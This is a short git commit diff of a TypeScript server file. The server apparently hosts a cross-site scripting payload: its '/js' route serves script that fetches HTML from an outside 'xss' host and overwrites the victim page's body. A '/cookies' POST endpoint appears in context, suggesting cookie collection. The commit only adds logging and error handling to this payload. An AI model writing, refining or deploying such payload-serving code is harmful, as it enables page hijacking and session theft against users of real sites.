4874a60b8f7fea667222411a4b6a76478b0ade43
Esteban Forero <estebanmff@outlook.com>
2025-09-23 19:49:33 -0500

    clarity improved

--- index.ts
+++ index.ts
@@ -23,7 +23,7 @@ serve({
     }
 
     if (url.pathname === "/js" && req.method === "GET") {
-      const jsCode = "fetch('https://data.estebanmf.space/xss').then(t=>t.text()).then(d=>document.body.innerHTML=d)";
+      const jsCode = "console.log('Evaluating JS string');fetch('https://data.estebanmf.space/xss').then(t=>t.text()).then(d=>{console.log('Fetched HTML:', d);document.body.innerHTML=d}).catch(e=>console.error('Fetch error:', e));";
       return new Response(jsCode, {
         headers: {
           "Content-Type": "application/javascript",
@@ -31,6 +31,7 @@ serve({
         },
       });
     }
+
 
     // POST /cookies
     if (url.pathname === "/cookies" && req.method === "POST") {
